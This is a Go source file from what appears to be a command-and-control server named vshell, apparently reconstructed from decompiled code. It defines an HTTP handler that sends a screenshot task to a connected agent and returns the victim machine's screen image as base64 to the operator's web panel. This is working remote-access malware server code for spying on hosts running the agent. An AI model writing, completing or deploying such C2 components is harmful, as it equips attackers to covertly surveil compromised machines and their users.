// Package controllers implements screenshot-related HTTP handlers.
// The current route and response behavior should be verified through implementation
// and tests rather than inferred solely from historical analysis artifacts.

package controllers

import (
	"strings"
	"time"

	"vshell/c2engine"
)

// ScreenshotController 提供 Agent 截图。
type ScreenshotController struct {
	ApiBaseController
}

// screenshotTimeout 是等待代理回传截图的上限。
// 前端该请求自身超时 120s（SPA：`timeout:120*1e3`），服务端留出余量。
const screenshotTimeout = 60 * time.Second

// Get 获取截图（GET /screenshot/get?id=<clientID>&quality=<big|normal|small>）。
//
// 前端（static/assets/vPNC64JSn.js）把返回值直接拼成
// `data:image/jpeg;base64,<result>` 交给 <img>，因此 result 必须是纯 base64，
// 不能包成 JSON 对象。quality 的取值与屏幕页共用（big/normal/small）。
//
// 反编译（0x18d9ba0 D8MCqi8Dry3）：拉起一次屏幕采集并把图像数据流回响应。
func (c *ScreenshotController) Get() {
	id := int64(c.JsonGetInt("id"))
	quality := c.JsonGetStr("quality")
	if id == 0 {
		c.JsonErr("id error")
		return
	}

	client := c2engine.GetEngine().GetClient(id)
	if client == nil || !client.Status {
		c.JsonErr("client is close")
		return
	}

	task, err := engineExecShellAsync(id, "screenshot quality="+quality)
	if err != nil {
		c.JsonErr(err.Error())
		return
	}
	result, err := waitTaskResult(task.ID, screenshotTimeout)
	if err != nil {
		c.JsonErr(err.Error())
		return
	}

	// The agent answers with a base64 image; anything else (an error string from
	// the capture tool) is surfaced as an error rather than a broken data URL.
	if result == "" || strings.ContainsAny(result, " \r\n") {
		c.JsonErr("screenshot failed")
		return
	}
	c.Ctx.Output.Header("Content-Type", "text/plain; charset=utf-8")
	_ = c.Ctx.Output.Body([]byte(result))
}
